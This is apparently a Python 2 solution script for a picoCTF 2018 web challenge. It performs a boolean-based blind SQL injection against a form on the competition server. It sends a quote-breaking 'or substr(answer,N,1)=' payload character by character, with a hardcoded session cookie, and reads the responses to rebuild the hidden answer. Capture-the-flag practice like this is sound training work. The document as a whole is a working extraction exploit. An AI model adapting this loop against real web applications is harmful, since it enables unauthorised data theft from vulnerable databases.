import requests
import string

headers = {"Origin": "http://2018shell1.picoctf.com:32635",
           "Content-Type": "application/x-www-form-urlencoded",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
           "Referer": "http://2018shell1.picoctf.com:32635/",
           "Cookie": "_ga=GA1.2.462784079.1538506491; _gid=GA1.2.1401433204.1538506491; remember_token=4|3ac124667f29fa5852224e6c46c961748aaccdc7265b1e29472615991e6e387490b5825c530894814407474c8fc3b6c85a36d51935391df2a65f985f4428026b; session=.eJwlj0FqAzEMAP_icw6SLcnafGaRLImGQAu7yan071noA2aY-W17HXl-tfvreOet7Y9o91aoOGHSsLX1TWukYAeBXOzTPVg72AYbI3P0DjWMo0xCwGcJkqwVwgNlTIq1aAUSz6WzzHkOUleeyhoQMirCoHoo8rBwMWq3ts6j9tfPM7-vHrPePcs3NkZMvIyGlEhqI7sABlB4x4t7n3n8T1D7-wBOtD6-.Dpc1sQ.NnG0QH-tXF6KfcHs3bHL37-yRPU"
           }
data = "answer=a%27+or+substr%28answer%2C{}%2C1%29%3D%27{}&debug=1"
url = "http://2018shell1.picoctf.com:32635/answer2.php"
go = 1
counter = 1
answer = ''

while go:
    print 'The string is: ', answer
    for i in string.printable:
        req = requests.post(url, data=data.format(counter,i), headers=headers)
        if req.content.find('Wrong') == -1:
            print 'success at: ',i
            answer += i
            break
    if req.content.find('close') == -1:
        print 'Finished: picoCTF{%s}' % answer
    counter+=1
